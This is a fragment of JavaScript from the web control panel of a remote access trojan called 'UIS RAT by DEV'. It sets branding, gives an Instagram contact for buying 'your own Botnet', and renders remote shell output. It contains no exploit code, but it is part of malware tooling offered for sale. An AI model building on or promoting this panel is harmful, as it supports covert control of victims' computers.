...
pd3.innerHTML="<center> <h3 style='color:red'>•Attention•<h3> </center><br>This is developed by UIS <b style='color:gold'>UIS RAT by DEV </b>contact for your own Botnet <a href='https://www.instagram.com/dev_u_op/' style='color:#0f8;'>INSTAGRAM</a>. Reselling , Changing Brand Name , Logo  are strictly prohibited.";
...
pd1.innerHTML="Contact the devloper instagram <a href='https://www.instagram.com/dev_u_op/' style='color:#0f8;'>@dev_u_op</a>";
...
pd.innerHTML="&copy; DevAdhikary aka dev_u_op";
document.getElementById("tophead").appendChild(pd);
$(".h4").text("UIS RAT by DEV");
...
$("#shellcmd").css("display","block");
$("#shelldata").html("UIS RAT Shell<br><br>"+o.replaceAll("\n","<br>"))
